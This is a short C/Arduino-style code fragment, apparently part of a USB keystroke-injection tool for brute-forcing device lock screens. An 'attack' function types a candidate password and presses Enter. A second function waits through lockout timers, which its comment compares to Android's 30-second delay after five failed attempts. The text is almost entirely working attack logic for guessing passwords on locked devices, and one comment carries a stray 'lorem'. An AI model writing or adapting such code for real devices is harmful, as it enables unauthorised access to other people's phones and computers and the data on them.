void attack(char* aPassword, char* aLogin = "", int delayLoginChange = 0)
{
  for (int j = 0 ; j < strlen(aPassword) ; j++) {
    typeLetter(aPassword[j]);
    delay(125);
  }
  delay(50);
  typeEnter();
  delay(500);
}



void initMouse()
{
  //mouseMove(2,0);
}

//this function is used to made the system wait when system is lock (like on Android, 30s every 5 failed attempt)lorem
void waitFunction()
{
  for (int k = 0; k < 6 ; k++)
  {
    typeEnter();
    delay(5000);
  }
  delay(150);
}
